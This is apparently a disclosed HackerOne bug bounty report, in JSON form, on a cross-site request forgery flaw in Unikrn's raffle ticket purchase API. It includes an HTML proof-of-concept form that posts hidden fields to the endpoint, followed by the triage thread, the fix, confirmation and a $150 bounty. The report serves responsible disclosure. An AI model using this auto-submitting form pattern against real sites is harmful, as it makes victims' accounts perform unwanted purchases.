{"id":272588,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzI1ODg=","url":"https://hackerone.com/reports/272588","title":"CSRF in Raffles Ticket Purchasing","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-09-28T04:08:10.330Z","submitted_at":"2017-09-28T04:08:10.330Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tolo7010","url":"/tolo7010","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2672,"url":"https://hackerone.com/unikrn","handle":"unikrn","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Unikrn","twitter_handle":"unikrnco","website":"https://unikrn.com","about":"Win prizes, bet safely and legally on esports and get the best multi-title coverage for fans and fanatics alike!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-04-10T02:10:08.175Z","bug_reporter_agreed_on_going_public_at":"2018-04-10T01:04:32.905Z","team_member_agreed_on_going_public_at":"2018-04-10T02:10:08.075Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Description:\n========\n\nAn API endpoint get executed with no CSRF prevention, the endpoint did not verify session_id required in the post form. An attacker can crafted malicious form (Poc), which is executed by authenticated user action leading to huge balance lost.\n\nPoc:\n===\n\n\u003c!doctype html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n\u003c/head\u003e \n\u003cbody\u003e\n\u003cform action=\"https://unikrn.com/apiv2/raffle/enter\" method=\"POST\" name=\"myForm\"\u003e\n\u003cinput type=\"hidden\" name=\"raffle\" id=\"raffle\" value=\"4775\"\u003e\n\u003cinput type=\"hidden\" name=\"tickets\" id=\"tickets\" value=\"1\"\u003e\n\u003cinput type=\"hidden\" name=\"session_id\" id=\"session_id\" value=\"\"\u003e\n\u003cinput value=\"Submit\" type=\"submit\"\"\u003e\n\u003c/form\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n\nRecommendations:\n=============\n\n- Implementing CSRF tokens.\n- Validate session_id on post form/JSON api input.","bounty_amount":"150.0","formatted_bounty":"$150","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-05-10T01:04:32.974Z","allow_singular_disclosure_after":-108048664.58120564,"singular_disclosure_allowed":true,"vote_count":19,"voters":["jokebookservice1","jensec","foobar7","muon4","emitrani","tolo7010","michan","eveeez","r3y","an0nym0us","and 9 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":453,"asset_type":"URL","asset_identifier":"unikrn.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2029690,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Where would you get the session id from ?","automated_response":false,"created_at":"2017-09-28T12:19:20.354Z","updated_at":"2017-09-28T12:19:20.354Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2029691,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"ahh \" did not verify session_id required\" sorry.","automated_response":false,"created_at":"2017-09-28T12:19:43.851Z","updated_at":"2017-09-28T12:19:43.851Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2029752,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I left it blank intentionally, while many endpoints raise \"no_session\" error if no session / invalid session specified. This endpoint ignores it, takes cookie as authentication, and the cookie get to the server when visited.","automated_response":false,"created_at":"2017-09-28T12:45:04.406Z","updated_at":"2017-09-28T12:45:04.406Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2035034,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please let me know if any updates available, thanks.\n\nRegards.","automated_response":false,"created_at":"2017-09-30T03:02:36.161Z","updated_at":"2017-09-30T03:02:36.161Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2046957,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi, took a while to check all endpoints and have a more general solution in place. Can you confirm its fixed? \nThx for the report?","automated_response":false,"created_at":"2017-10-05T15:40:13.664Z","updated_at":"2017-10-05T15:40:13.664Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"tolo7010","url":"/tolo7010"},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2047069,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"the reproduction doesnot work anymore. fixed confirmed","automated_response":false,"created_at":"2017-10-05T16:10:31.145Z","updated_at":"2017-10-05T16:10:31.145Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2047089,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2017-10-05T16:16:35.581Z","updated_at":"2017-10-05T16:16:35.581Z","actor":{"url":"/unikrn","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Unikrn"}},"bounty_amount":"150.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"unikrn","collaborator":{"username":"tolo7010","url":"/tolo7010"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2047146,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"thanks for the bounty!\n\nRegards","automated_response":false,"created_at":"2017-10-05T16:44:58.535Z","updated_at":"2017-10-05T16:44:58.535Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2584396,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-04-10T01:04:32.938Z","updated_at":"2018-04-10T01:04:32.938Z","first_to_agree":true,"actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2584491,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thx again tololovejoi","automated_response":false,"created_at":"2018-04-10T02:10:08.107Z","updated_at":"2018-04-10T02:10:08.107Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2584492,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-04-10T02:10:08.201Z","updated_at":"2018-04-10T02:10:08.201Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}